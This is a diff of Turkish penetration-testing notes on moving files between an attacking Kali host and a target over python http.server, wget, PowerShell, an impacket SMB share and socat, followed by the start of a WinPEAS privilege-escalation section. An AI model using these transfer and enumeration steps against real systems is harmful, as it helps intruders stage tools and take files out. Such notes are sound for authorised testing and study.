@@ -14,6 +14,13 @@
 **Dosya paylaşımı için komutlar:**
 - ```python3 -m http.server``` ile dinlendikten sonra, hedef üzerinde ```wget IP_ADRESI:PORT/DOSYA_ADI``` ile veya powershell varsa ```powershelliwr -Uri IP_ADRESI:PORT/DOSYA_ADI -Outfile ÇIKTI_DOSYASI``` şeklinde kullanılabilir.
 - SMB dosya paylaşım servisi ile birçok Windows sürümü için ```impacket-smbserver DIZIN .``` komutu kali linux üzerinde çalıştırıldıktan sonra, hedef windows üzerinde komut satırından ```copy \\KALI_IP\DIZIN\DOSYA_ADI``` komutları ile dosya alınabilir. Burada **DIZIN** sizin belirlediğiniz herhangi bir isim olabilir. **DIZIN** ifadesinden sonra "**.**" ile kali üzerinde o an bulunulan dizin servis edilmiş olur ve istenirse klasör adı belirtilerek değiştirilebilir.
+- **Socat ile dosya paylaşımı:** 
+  *Server sending file:*
+server: ```socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr```
+client: ```socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat```
+*Server receiving file:*
+server: ```socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt```
+client: ```socat -u FILE:test.txt TCP:127.0.0.1:9876```
 ***
 ##*1. Enumeration with WinPEAS*
 Winpeas daha sonra anlatılacak olan bir çok yöntemi sömürmek için gerekli açıklıkları bulmaktadır. Ayrıca sistemde hardcoded kayıtlı parolalar ve zamanlanmış görevler gibi yetki yükseltmeye yarayabilecek bilgileri de sunar.
